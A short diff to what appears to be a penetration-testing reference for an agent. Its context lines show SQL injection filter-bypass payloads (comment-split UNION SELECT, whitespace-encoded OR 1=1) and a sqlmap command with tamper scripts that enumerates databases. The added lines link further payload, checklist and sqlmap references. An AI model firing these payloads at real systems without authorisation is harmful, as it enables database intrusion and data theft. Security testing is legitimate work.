@@ -105,3 +105,9 @@ UN/**/ION SE/**/LECT NULL,version(),NULL--   # Comment insertion
 '%09OR%091=1--                               # Whitespace alternatives
 sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
 ```
+
+## Extended Resources
+
+- `agent/references/payloads/sqli-payloads.md` — UNION, blind, error-based, time-based, WAF bypass, auth bypass per DB type
+- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
+- `agent/references/tools/exploitation/sqlmap.md` — sqlmap flags, tamper scripts, and output handling
